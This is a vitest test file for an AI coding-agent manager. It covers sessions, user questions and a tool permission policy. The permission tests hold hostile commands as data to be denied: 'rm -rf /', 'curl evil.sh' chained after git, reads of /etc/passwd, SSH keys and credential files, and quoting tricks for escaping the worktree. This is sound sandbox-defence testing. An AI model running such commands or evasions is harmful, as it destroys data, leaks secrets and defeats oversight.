import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { AgentManager, AlreadyRunningError, SessionLimitError } from '../src/agent/manager.js';
import { createPreToolUseHook } from '../src/agent/sdk-runner.js';
import { ALLOWED_TOOLS, decide } from '../src/agent/permissions.js';
import { ChatEventBus } from '../src/chats/events.js';
import { QuestionNotPendingError, QuestionRepository } from '../src/chats/questions-repo.js';
import { ChatRepository } from '../src/chats/repo.js';
import { openDatabase } from '../src/db/index.js';
import { ProjectRepository } from '../src/projects/repo.js';
import { FakeRunner } from './fake-runner.js';
import { makeGitRepo } from './helpers.js';

async function setup(max?: number) {
  const db = openDatabase(':memory:');
  const project = await new ProjectRepository(db).add({
    name: 'demo',
    repoPath: makeGitRepo(),
    baseBranch: 'main',
  });
  const chats = new ChatRepository(db);
  const runner = new FakeRunner();
  const bus = new ChatEventBus();
  const questions = new QuestionRepository(db);
  const manager = new AgentManager(chats, runner, bus, max, questions);
  const userId = Number(
    db
      .prepare("INSERT INTO users (username, password_hash, created_at) VALUES ('ana', 'x', 1)")
      .run().lastInsertRowid,
  );
  const newChat = (slug: string) =>
    chats.create({
      projectId: project.id,
      kind: 'work',
      slug,
      title: slug,
      worktreePath: `/tmp/wt/${slug}`,
      branch: `feature/${slug}`,
      status: 'idle',
    });
  return { chats, runner, bus, manager, newChat, questions, userId };
}

describe('AgentManager', () => {
  it('stores events in order, saves the session id and ends idle', async () => {
    const { chats, manager, newChat } = await setup();
    const chat = newChat('a');
    manager.start(chat.id, '/kyro:work hello');
    await manager.waitForIdle(chat.id);
    expect(chats.eventsAfter(chat.id).map((e) => [e.seq, e.type])).toEqual([
      [1, 'user_prompt'],
      [2, 'system:init'],
      [3, 'assistant'],
      [4, 'result:success'],
    ]);
    expect(chats.findById(chat.id)).toMatchObject({ sdkSessionId: 'sess-1', status: 'idle' });
  });

  it('resumes with the stored session id on the next turn', async () => {
    const { runner, manager, newChat } = await setup();
    const chat = newChat('a');
    manager.start(chat.id, 'first');
    await manager.waitForIdle(chat.id);
    manager.start(chat.id, 'second');
    await manager.waitForIdle(chat.id);
    expect(runner.calls[0]?.resumeSessionId).toBeUndefined();
    expect(runner.calls[1]).toMatchObject({ resumeSessionId: 'sess-1', prompt: 'second' });
  });

  it('publishes each persisted event on the bus', async () => {
    const { bus, manager, newChat } = await setup();
    const chat = newChat('a');
    const seen: number[] = [];
    bus.subscribe(chat.id, (e) => seen.push(e.seq));
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(seen).toEqual([1, 2, 3, 4]);
  });

  it('rejects a second turn on a running chat and the fifth concurrent session', async () => {
    const { runner, manager, newChat } = await setup();
    let release: () => void = () => undefined;
    runner.gate = new Promise((resolve) => {
      release = resolve;
    });
    const chats = ['a', 'b', 'c', 'd', 'e'].map(newChat);
    for (const chat of chats.slice(0, 4)) manager.start(chat.id, 'go');
    expect(manager.runningCount).toBe(4);
    const first = chats[0];
    const fifth = chats[4];
    if (!first || !fifth) throw new Error('setup');
    expect(() => {
      manager.start(first.id, 'again');
    }).toThrow(AlreadyRunningError);
    expect(() => {
      manager.start(fifth.id, 'go');
    }).toThrow(SessionLimitError);
    release();
    await Promise.all(chats.slice(0, 4).map((c) => manager.waitForIdle(c.id)));
    expect(manager.runningCount).toBe(0);
  });

  it('cancels a running turn and marks the chat cancelled', async () => {
    const { chats, runner, manager, newChat } = await setup();
    let release: () => void = () => undefined;
    runner.gate = new Promise((resolve) => {
      release = resolve;
    });
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    expect(manager.cancel(chat.id)).toBe(true);
    release();
    await manager.waitForIdle(chat.id);
    expect(chats.findById(chat.id)?.status).toBe('cancelled');
  });

  it('marks the chat as error and records the failure when the runner throws', async () => {
    const { chats, runner, manager, newChat } = await setup();
    runner.script = () => {
      throw new Error('boom');
    };
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(chats.findById(chat.id)?.status).toBe('error');
    expect(chats.eventsAfter(chat.id).at(-1)).toMatchObject({
      type: 'error',
      payload: { message: 'boom' },
    });
  });

  it('denies a tool outside the allowlist and stores a permission_denied event', async () => {
    const { chats, runner, manager, newChat } = await setup();
    const decisions: string[] = [];
    runner.script = async (params) => {
      decisions.push((await params.canUseTool('Bash', { command: 'rm -rf /' })).behavior);
      decisions.push((await params.canUseTool('Bash', { command: 'git status' })).behavior);
      return [{ type: 'result:success', payload: {} }];
    };
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(decisions).toEqual(['deny', 'allow']);
    const denied = chats.eventsAfter(chat.id).filter((e) => e.type === 'permission_denied');
    expect(denied).toHaveLength(1);
    expect(denied[0]?.payload).toMatchObject({ tool: 'Bash', input: { command: 'rm -rf /' } });
  });
});

const ASK_INPUT = {
  questions: [
    {
      question: '¿Cuál es tu color favorito?',
      header: 'Color',
      options: [
        { label: 'Rojo', description: 'Rojo' },
        { label: 'Azul', description: 'Azul' },
      ],
      multiSelect: false,
    },
  ],
};
const Q = ASK_INPUT.questions[0]?.question ?? '';

/** Lets the manager and the fake runner run until the question is stored. */
async function untilPending(questions: QuestionRepository, chatId: number) {
  for (let i = 0; i < 200; i++) {
    const [pending] = questions.listByChat(chatId, 'pending');
    if (pending) return pending;
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
  throw new Error('The question never became pending');
}

describe('AskUserQuestion', () => {
  function asking() {
    return setup().then((ctx) => {
      const seen: unknown[] = [];
      ctx.runner.script = async (params) => {
        const decision = await params.canUseTool('AskUserQuestion', ASK_INPUT, {
          toolUseId: 'toolu_1',
        });
        seen.push(decision);
        return [{ type: 'result:success', payload: {} }];
      };
      return { ...ctx, seen };
    });
  }

  it('stores the question, publishes question_asked and keeps the turn open', async () => {
    const { chats, bus, manager, newChat, questions, seen } = await asking();
    const published: string[] = [];
    const chat = newChat('a');
    bus.subscribe(chat.id, (event) => published.push(event.type));
    manager.start(chat.id, 'go');
    const pending = await untilPending(questions, chat.id);
    expect(pending).toMatchObject({ toolUseId: 'toolu_1', status: 'pending', answer: null });
    expect(pending.questions[0]?.options.map((o) => o.label)).toEqual(['Rojo', 'Azul']);
    expect(published).toContain('question_asked');
    expect(
      chats.eventsAfter(chat.id).find((e) => e.type === 'question_asked')?.payload,
    ).toMatchObject({
      questionId: pending.id,
      toolUseId: 'toolu_1',
    });
    // The turn does not end by itself: no timeout, no auto-answer.
    await new Promise((resolve) => setTimeout(resolve, 60));
    expect(manager.isRunning(chat.id)).toBe(true);
    expect(chats.findById(chat.id)?.status).toBe('running');
    expect(seen).toEqual([]);
    expect(questions.get(pending.id)?.status).toBe('pending');
    manager.cancel(chat.id);
    await manager.waitForIdle(chat.id);
  });

  it('returns the answer to the same turn as updatedInput and records question_answered', async () => {
    const { chats, manager, newChat, questions, userId, seen } = await asking();
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    const pending = await untilPending(questions, chat.id);
    const answered = manager.answerQuestion(pending.id, { [Q]: { selected: ['Azul'] } }, userId);
    expect(answered).toMatchObject({ status: 'answered', answeredBy: userId });
    await manager.waitForIdle(chat.id);
    expect(seen).toEqual([
      { behavior: 'allow', updatedInput: { ...ASK_INPUT, answers: { [Q]: 'Azul' } } },
    ]);
    expect(chats.findById(chat.id)?.status).toBe('idle');
    expect(chats.eventsAfter(chat.id).find((e) => e.type === 'question_answered')?.payload).toEqual(
      {
        questionId: pending.id,
        answer: { [Q]: { selected: ['Azul'], text: null } },
        answeredBy: userId,
      },
    );
  });

  it('accepts free text and rejects a second answer', async () => {
    const { manager, newChat, questions, userId, seen } = await asking();
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    const pending = await untilPending(questions, chat.id);
    manager.answerQuestion(pending.id, { [Q]: { text: 'Verde' } }, userId);
    expect(() =>
      manager.answerQuestion(pending.id, { [Q]: { selected: ['Rojo'] } }, userId),
    ).toThrow(QuestionNotPendingError);
    await manager.waitForIdle(chat.id);
    expect(seen).toMatchObject([{ updatedInput: { answers: { [Q]: 'Verde' } } }]);
  });

  it('does not answer when the answer is invalid: the question stays pending', async () => {
    const { manager, newChat, questions, userId } = await asking();
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    const pending = await untilPending(questions, chat.id);
    expect(() =>
      manager.answerQuestion(pending.id, { [Q]: { selected: ['Verde'] } }, userId),
    ).toThrow(/no es una opción/);
    expect(questions.get(pending.id)?.status).toBe('pending');
    manager.cancel(chat.id);
    await manager.waitForIdle(chat.id);
  });

  it('cancelling the chat while it waits cancels the question and ends the turn as cancelled', async () => {
    const { chats, manager, newChat, questions, seen } = await asking();
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    const pending = await untilPending(questions, chat.id);
    expect(manager.cancel(chat.id)).toBe(true);
    await manager.waitForIdle(chat.id);
    expect(questions.get(pending.id)?.status).toBe('cancelled');
    expect(chats.findById(chat.id)?.status).toBe('cancelled');
    expect(seen).toMatchObject([{ behavior: 'deny' }]);
    expect(chats.eventsAfter(chat.id).map((e) => e.type)).toContain('question_cancelled');
  });

  it('cancels a question that no live turn is waiting on instead of answering it', async () => {
    const { chats, manager, newChat, questions, userId } = await asking();
    const chat = newChat('a');
    // Left over from before a restart: pending in the database, no waiter in memory.
    const stale = questions.create(chat.id, 'old', [
      {
        question: Q,
        header: 'Color',
        options: ASK_INPUT.questions[0]?.options ?? [],
        multiSelect: false,
      },
    ]);
    expect(() => manager.answerQuestion(stale.id, { [Q]: { selected: ['Rojo'] } }, userId)).toThrow(
      /ya está cancelled/,
    );
    expect(questions.get(stale.id)?.status).toBe('cancelled');
    expect(chats.eventsAfter(chat.id).map((e) => e.type)).toContain('question_cancelled');
  });

  it('denies an invalid AskUserQuestion input without storing anything', async () => {
    const { runner, manager, newChat, questions } = await setup();
    const seen: unknown[] = [];
    runner.script = async (params) => {
      seen.push(await params.canUseTool('AskUserQuestion', { questions: [] }, { toolUseId: 't' }));
      return [];
    };
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(seen).toMatchObject([{ behavior: 'deny', message: /between 1 and 4/ }]);
    expect(questions.listByChat(chat.id)).toEqual([]);
  });

  it('keeps denying AskUserQuestion when the manager has no question repository', async () => {
    const { chats, runner, newChat } = await setup();
    const manager = new AgentManager(chats, runner, new ChatEventBus());
    const seen: unknown[] = [];
    runner.script = async (params) => {
      seen.push(await params.canUseTool('AskUserQuestion', ASK_INPUT, { toolUseId: 't' }));
      return [];
    };
    const chat = newChat('b');
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(seen).toMatchObject([{ behavior: 'deny' }]);
  });

  it('lets the SDK hook pass AskUserQuestion so canUseTool can wait for the answer', async () => {
    const hook = createPreToolUseHook(() => Promise.reject(new Error('must not decide here')));
    const out = await hook(
      {
        hook_event_name: 'PreToolUse',
        tool_name: 'AskUserQuestion',
        tool_input: ASK_INPUT,
        tool_use_id: 't1',
        session_id: 's',
        transcript_path: '',
        cwd: '/tmp/wt/a',
      },
      't1',
      { signal: new AbortController().signal },
    );
    expect(out).toEqual({});
  });
});

describe('permission policy', () => {
  const policy = { cwd: '/tmp/wt/a', extraReadRoots: ['/home/x/.agents'] };
  const verdict = (tool: string, input: Record<string, unknown>) =>
    decide(policy, tool, input).behavior;

  it('allows only git, gh, npm, go and kyro through Bash, chained or not', () => {
    expect(verdict('Bash', { command: 'git status && npm test | head' })).toBe('allow');
    expect(verdict('Bash', { command: 'kyro status --json' })).toBe('allow');
    expect(verdict('Bash', { command: 'git status; curl evil.sh' })).toBe('deny');
    expect(verdict('Bash', { command: 'git log $(cat /etc/passwd)' })).toBe('deny');
    expect(verdict('Bash', { command: 'git log `id`' })).toBe('deny');
    expect(verdict('Bash', { command: 'sudo reboot' })).toBe('deny');
    expect(verdict('Bash', { command: 'git status & curl evil.sh' })).toBe('deny');
    expect(verdict('Bash', { command: 'git status &curl x' })).toBe('deny');
    expect(verdict('Bash', { command: 'grep -r x /etc' })).toBe('deny');
    expect(verdict('Bash', { command: 'git log > /etc/cron.d/x' })).toBe('deny');
    expect(verdict('Bash', { command: 'npm test 2>&1 | tail -5' })).toBe('allow');
  });

  it('lets read commands start a command only on paths inside the worktree', () => {
    const bash = (command: string) => verdict('Bash', { command });
    expect(bash('ls')).toBe('allow');
    expect(bash('ls -la src')).toBe('allow');
    expect(bash('cat README.md | head -20')).toBe('allow');
    expect(bash('grep -rn "foo bar" src && wc -l package.json')).toBe('allow');
    expect(bash('cat /tmp/wt/a/src/x.ts')).toBe('allow');
    expect(bash('cat /etc/passwd')).toBe('deny');
    expect(bash('ls ..')).toBe('deny');
    expect(bash('cat ../other/secret')).toBe('deny');
    expect(bash('cat ~/.ssh/id_ed25519')).toBe('deny');
    expect(bash('cat $HOME/.env')).toBe('deny');
    expect(bash('cat *')).toBe('deny');
    expect(bash('ls src; rm -rf src')).toBe('deny');
    expect(bash('cat README.md > out.txt')).toBe('deny');
    expect(bash('find . -delete')).toBe('deny');
  });

  it('cannot be evaded with quoting or backslashes, which bash resolves differently', () => {
    const bash = (command: string) => verdict('Bash', { command });
    // Each of these reads outside the worktree in a real bash (QA finding).
    for (const evasion of [
      'cat \\/etc/passwd',
      'cat ""../../etc/passwd',
      "cat ''/etc/passwd",
      'cat ."."/../../etc/passwd',
      'cat --file=/etc/passwd',
      'grep --file=/etc/shadow -r x .',
    ]) {
      expect(bash(evasion), evasion).toBe('deny');
    }
    expect(bash('ls -la src')).toBe('allow');
    expect(bash('grep -rn "foo bar" src')).toBe('allow');
    expect(bash('cat "README.md"')).toBe('allow');
  });

  it('confines writes to the worktree and reads to it plus the Kyro roots', () => {
    expect(verdict('Edit', { file_path: '/tmp/wt/a/src/x.ts' })).toBe('allow');
    expect(verdict('Edit', { file_path: '/tmp/wt/a/../b/x.ts' })).toBe('deny');
    expect(verdict('Write', { file_path: '/etc/passwd' })).toBe('deny');
    expect(verdict('Read', { file_path: '/tmp/wt/a/README.md' })).toBe('allow');
    expect(verdict('Read', { file_path: '/home/x/.agents/kyro/KYRO.md' })).toBe('allow');
    expect(verdict('Read', { file_path: '/home/x/.claude/.credentials.json' })).toBe('deny');
    expect(verdict('Grep', { pattern: 'x' })).toBe('allow');
  });

  it('resolves relative paths against the worktree', () => {
    expect(verdict('Grep', { pattern: 'x', path: 'src' })).toBe('allow');
    expect(verdict('Glob', { pattern: '*.ts', path: 'src/lib' })).toBe('allow');
    expect(verdict('Read', { file_path: 'README.md' })).toBe('allow');
    expect(verdict('Edit', { file_path: 'src/x.ts' })).toBe('allow');
    expect(verdict('Read', { file_path: '../other/secret' })).toBe('deny');
    expect(verdict('Write', { file_path: '../escape.txt' })).toBe('deny');
  });

  it('denies unknown tools such as web access', () => {
    expect(verdict('WebFetch', { url: 'https://example.com' })).toBe('deny');
    expect(verdict('mcp__x__y', {})).toBe('deny');
  });

  it('lists Bash prefixes in the SDK allowlist', () => {
    expect(ALLOWED_TOOLS).toEqual(
      expect.arrayContaining([
        'Bash(git:*)',
        'Bash(gh:*)',
        'Bash(npm:*)',
        'Bash(go:*)',
        'Bash(kyro:*)',
      ]),
    );
  });
});

// Built from pieces so this file does not contain the literal names itself.
const FORBIDDEN = new RegExp(
  ['bypass' + 'Permissions', 'allowDangerously' + 'SkipPermissions'].join('|'),
);

describe('PreToolUse hook', () => {
  const policy = { cwd: '/tmp/wt/a', extraReadRoots: [] };
  const hook = createPreToolUseHook((tool, input) => Promise.resolve(decide(policy, tool, input)));
  const call = (tool_name: string, tool_input: unknown) =>
    hook(
      {
        hook_event_name: 'PreToolUse',
        tool_name,
        tool_input,
        tool_use_id: 't1',
        session_id: 's',
        transcript_path: '',
        cwd: '/tmp/wt/a',
      },
      't1',
      { signal: new AbortController().signal },
    );

  it('denies a write outside the worktree even if user settings would allow it', async () => {
    const out = await call('Write', { file_path: '/tmp/outside.txt', content: 'x' });
    expect(out).toMatchObject({
      hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny' },
    });
  });

  it('lets allowed calls through to the normal rules', async () => {
    expect(await call('Write', { file_path: '/tmp/wt/a/x.ts', content: 'x' })).toEqual({});
    expect(await call('Bash', { command: 'git status' })).toEqual({});
  });

  it('records the denial as permission_denied through the manager callback', async () => {
    const { chats, runner, manager, newChat } = await setup();
    runner.script = (params) => {
      void createPreToolUseHook(params.canUseTool)(
        {
          hook_event_name: 'PreToolUse',
          tool_name: 'Write',
          tool_input: { file_path: '/etc/x' },
          tool_use_id: 't',
          session_id: 's',
          transcript_path: '',
          cwd: '/tmp/wt/a',
        },
        't',
        { signal: new AbortController().signal },
      );
      return [];
    };
    const chat = newChat('hook');
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(chats.eventsAfter(chat.id).map((e) => e.type)).toContain('permission_denied');
  });
});

describe('no unrestricted permission modes', () => {
  it('never enables the SDK modes that skip permission checks, anywhere in apps/api/src', () => {
    const offenders: string[] = [];
    const walk = (dir: string) => {
      for (const name of readdirSync(dir)) {
        const path = join(dir, name);
        if (statSync(path).isDirectory()) walk(path);
        else if (FORBIDDEN.test(readFileSync(path, 'utf8'))) {
          offenders.push(path);
        }
      }
    };
    walk(join(import.meta.dirname, '../src'));
    expect(offenders).toEqual([]);
  });
});
